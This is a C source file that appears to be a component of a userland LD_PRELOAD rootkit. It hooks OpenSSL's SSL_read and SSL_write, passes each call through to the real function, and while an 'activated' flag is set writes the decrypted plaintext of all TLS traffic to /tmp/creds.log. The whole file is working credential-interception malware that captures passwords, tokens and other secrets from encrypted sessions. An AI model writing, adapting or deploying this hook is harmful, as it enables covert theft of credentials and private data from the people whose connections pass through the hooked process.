#define _GNU_SOURCE
#include "hooks.h"

#include <dlfcn.h>
#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <string.h>

extern int activated;

static int (*real_SSL_read)(SSL*, void*, int) = NULL;
static int (*real_SSL_write)(SSL*, const void*, int) = NULL;
static pthread_mutex_t log_mutex = PTHREAD_MUTEX_INITIALIZER;

static void load_SSL_read_orig(void) {
    if (!real_SSL_read) {
        real_SSL_read = dlsym(RTLD_NEXT, "SSL_read");
        if (!real_SSL_read) {
            fprintf(stderr, "dlsym SSL_read failed\n");
            exit(EXIT_FAILURE);
        }
    }
}

static void load_SSL_write_orig(void) {
    if (!real_SSL_write) {
        real_SSL_write = dlsym(RTLD_NEXT, "SSL_write");
        if (!real_SSL_write) {
            fprintf(stderr, "dlsym SSL_write failed\n");
            exit(EXIT_FAILURE);
        }
    }
}

static void log_to_file(const void *data, int length, const char *direction) {
    pthread_mutex_lock(&log_mutex);

    FILE *f = fopen("/tmp/creds.log", "a");
    if (!f) {
        perror("fopen");
        pthread_mutex_unlock(&log_mutex);
        return;
    }

    fprintf(f, "[%s] %d bytes\n", direction, length);
    fwrite(data, 1, length, f);
    fprintf(f, "\n\n");
    fclose(f);

    pthread_mutex_unlock(&log_mutex);
}

//SSL_read
int SSL_read(SSL *ssl, void *buf, int num) {
    load_SSL_read_orig();
    int bytes_read = real_SSL_read(ssl, buf, num);

    if (activated && bytes_read > 0) {
        log_to_file(buf, bytes_read, "SSL_read");
    }

    return bytes_read;
}

// SSL_write
int SSL_write(SSL *ssl, const void *buf, int num) {
    load_SSL_write_orig();
    int bytes_written = real_SSL_write(ssl, buf, num);

    if (activated && bytes_written > 0) {
        log_to_file(buf, bytes_written, "SSL_write");
    }

    return bytes_written;
}
